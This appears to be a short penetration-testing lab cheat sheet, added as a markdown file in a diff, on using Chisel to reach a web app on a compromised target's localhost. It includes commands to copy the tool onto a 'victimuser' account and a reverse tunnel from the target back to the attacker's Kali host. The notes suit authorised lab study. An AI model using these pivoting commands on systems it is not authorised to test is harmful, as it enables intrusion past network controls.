@@ -1,0 +1,70 @@
+```markdown
+# Chisel - Port Forwarding for Webapp Access (localhost on target)
+
+## Scenario
+Webapp running on target localhost and you need to access from your local machine
+
+## Solution
+Chisel
+
+## First - Move Chisel from Kali machine (192.168.45.184) to target (192.168.238.103)
+```bash
+wget http://192.168.45.184:8000/chisel -O /tmp/chisel
+scp /tmp/chisel victimuser@192.168.238.103:/tmp/chisel
+```
+
+---
+
+## Method 1 - Local Port Forwarding
+
+**Server:**
+```bash
+/tmp/chisel server --port 9000
+```
+
+**Kali:**
+```bash
+chisel client 192.168.238.103:9000 80:localhost:8080
+```
+
+**Kali:** Open a browser on your Kali machine. Navigate to http://localhost:8080.
+
+### Explanation - Local Port Forwarding
+\# Start chisel listening on port 9000 on server:  
+\# Kali Machine, connect to the server and forward the webapp port.  
+\# 192.168.238.103:9000: Chisel server’s IP and port.  
+\# 80:localhost:8080: Maps port 80 on the server to port 8080 on Kali.
+
+---
+
+## Method 2 - Reverse Port Forwarding
+
+**Kali:**
+```bash
+chisel server --port 9000 --reverse
+```
+
+**Server:**
+```bash
+chisel client 192.168.45.184:9000 R:8080:127.0.0.1:80
+```
+
+**Kali:** Open a browser on your Kali machine. Navigate to http://localhost:8080.
+
+### Explanation of Reverse Port Forwarding
+\# The kali machine runs the Chisel server on port 9000 with the --reverse flag to allow reverse tunnel connections.  
+\# The server machine runs the Chisel client and connects to the kali machine’s Chisel server at 192.168.45.184:9000.  
+\# The R flag specifies reverse port forwarding.  
+\# 8080 is the port on the kali machine that will be exposed to access the server’s service.  
+\# 127.0.0.1:80 refers to the service running on the server’s localhost on port 80 (e.g., a web server).  
+\# This setup creates a reverse tunnel where port 8080 on the kali machine is forwarded to port 80 on the server machine.
+
+---
+
+## To Kill Chisel
+```bash
+# Stop the Chisel client on Kali with Ctrl+C.
+# Stop the Chisel server on the server:
+pkill chisel
+```
+```
